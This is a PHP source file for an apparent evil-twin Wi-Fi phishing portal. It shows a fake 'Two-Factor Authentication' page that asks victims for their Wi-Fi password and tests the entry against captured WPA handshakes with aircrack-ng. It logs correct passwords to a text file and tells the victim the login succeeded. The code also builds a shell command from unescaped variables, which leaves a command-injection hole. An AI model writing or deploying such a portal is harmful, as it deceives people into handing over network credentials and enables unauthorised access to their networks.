<?php
$wifi_network = 'AirFiber-aMa9io';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Path to the .cap file containing the handshake
    $cap_files = [
        "AirFiber-aMa9io" => "cap/AirFiber-01.cap",
        "Charli-M35" => "cap/charli-01.cap",
        "Network3" => "cap/handshake_network3.cap"
    ];

    if (array_key_exists($wifi_network, $cap_files)) {
        $cap_file = $cap_files[$wifi_network];
    } else {
        $message = "<div class='alert alert-danger'>Your input is invalid! Try again.</div>";
    }

    // Write the password to a temporary file
    $temp_file = tempnam(sys_get_temp_dir(), 'wifi_password');
    file_put_contents($temp_file, $wifi_password);

    // Run aircrack-ng to check the password
    $cmd = "aircrack-ng $cap_file -w $temp_file 2>&1";
    $output = shell_exec("bash -c \"$cmd\"");

    // Delete the temporary file
    unlink($temp_file);

    // Check if aircrack-ng found the password
    if (strpos($output, "KEY FOUND") !== false) {
        $success = true;
        $log_file = '/var/www/html/password_log.txt';
        $log_message = "$wifi_network : $wifi_password\n";
        
        if (is_writable($log_file)) {
            $result = file_put_contents($log_file, $log_message, FILE_APPEND);
            
            if ($result === false) {
                $message = "<div class='alert alert-danger'>Something went wrong. Please try again.[Code:7877]</div>";
            } else {
                $message = "<div class='alert alert-success'>Two-Factor authentication successfully completed.</div>";
            }
        } else {
            $message = "<div class='alert alert-danger'>Something went wrong. Please try again.[Code:7876]</div>";
        }
    } else {
        $message = "<div class='alert alert-danger'>Invalid password! Try again.</div>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$wifi_network ?> Login</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color:rgb(162, 168, 173);
        }
        .login-box {
            max-width: 600px;
            margin: 100px auto;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            background: #ffffff;
        }
        @media (max-width: 768px) {
            .login-box {
                margin: 50px auto;
                padding: 15px;
            }
        }
        @media (max-width: 576px) {
            .login-box {
                margin: 20px auto;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="text-center">
                <img src="img/wifi-sign.png" alt="WiFi Image" class="img-fluid" style="width: 200px;">
            </div>
            <h2 class="text-center">Wi-Fi Security Layer</h2>
            <h4 class="text-center">Two-Factor Authentication</h4>
            <p class="text-center text-muted">Password required to access Wi-FI network <b><?=$wifi_network ?></b></p>

            <?php if (isset($message)) echo $message; ?>

            <?php if(!isset($success)): ?>
            <form method="post">
                <div class="mb-3">
                    <input type="hidden" name="network" value="<?=$wifi_network ?>">
                    <label for="password" class="form-label">WiFi Password</label>
                    <input type="password" class="form-control" name="password" required autocomplete="off" placeholder="Enter your Wi-Fi password">
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
            </form>
            <?php endif ?>
        </div>
    </div>

</html>
